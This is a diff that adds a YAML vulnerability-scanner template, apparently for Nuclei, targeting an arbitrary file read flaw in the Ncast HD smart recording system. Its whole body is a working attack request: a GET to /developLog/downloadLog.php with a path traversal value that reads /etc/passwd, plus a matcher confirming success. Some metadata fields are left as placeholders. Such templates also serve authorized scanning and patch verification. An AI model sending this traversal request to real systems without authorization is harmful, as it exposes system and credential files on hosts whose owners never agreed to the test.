@@ -1,0 +1,19 @@
+id: Ncast-downloadLog-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: Ncast高清智能录播系统存在任意文件读取漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/1d1ffb9f40ef425e6558f039fb2296fe4a89b584/Ncast%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md?plain=1#L10
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/developLog/downloadLog.php?name=../../../../etc/passwd"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
